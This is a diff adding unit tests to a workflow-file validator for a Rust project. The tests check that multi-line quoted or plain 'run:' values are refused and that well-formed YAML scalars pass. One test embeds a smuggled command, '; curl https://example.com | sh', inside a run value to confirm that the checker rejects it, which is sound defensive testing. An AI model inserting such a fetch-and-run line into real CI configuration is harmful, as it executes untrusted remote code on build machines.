@@ -225,8 +225,26 @@ class Check(unittest.TestCase):
 
     def test_block_scalar_body_in_steps_is_not_refused(self):
         ok = GOOD.replace("        run: cargo test --locked -p broadsword\n",
-                          "        run: cargo test --locked -p broadsword\n      - name: Note\n        env:\n          K: v\n        shell: bash\n")
+                          "        run: cargo test --locked -p broadsword\n      - name: |\n          words: with a colon\n          and a bare line\n        env:\n          K: v\n")
+        self.assertIn("name: |", ok)
         self.assertFalse(any("unrecognised form" in x for x in problems(ok)), problems(ok))
+
+    def test_quoted_run_continues_onto_next_line_double(self):
+        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", 'run: "cargo test --locked -p broadsword\n          zz: x"'), "unrecognised form")
+
+    def test_quoted_run_continuation_runs_extra_command(self):
+        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", 'run: "cargo test --locked -p broadsword\n          ok: ; curl https://example.com | sh"'), "unrecognised form")
+
+    def test_quoted_run_continues_onto_next_line_single(self):
+        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", "run: 'cargo test --locked -p broadsword\n          zz: x'"), "unrecognised form")
+
+    def test_plain_run_continuation_inside_steps(self):
+        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", "run: cargo test --locked -p broadsword\n          zz: x"), "unrecognised form")
+
+    def test_quoted_scalar_closed_on_its_own_line_is_fine(self):
+        ok = GOOD.replace("      - name: Build\n", '      - name: "Build \\" it"\n').replace("      - name: Test\n", "      - name: 'It''s a test'\n")
+        self.assertIn("It''s", ok)
+        self.assertEqual(problems(ok), [])
 
     def test_expression_braces_are_not_flow(self):
         self.assertEqual(problems(GOOD.replace("        run: cargo build", "        env:\n          K: ${{ github.sha }}\n        run: cargo build")), [])
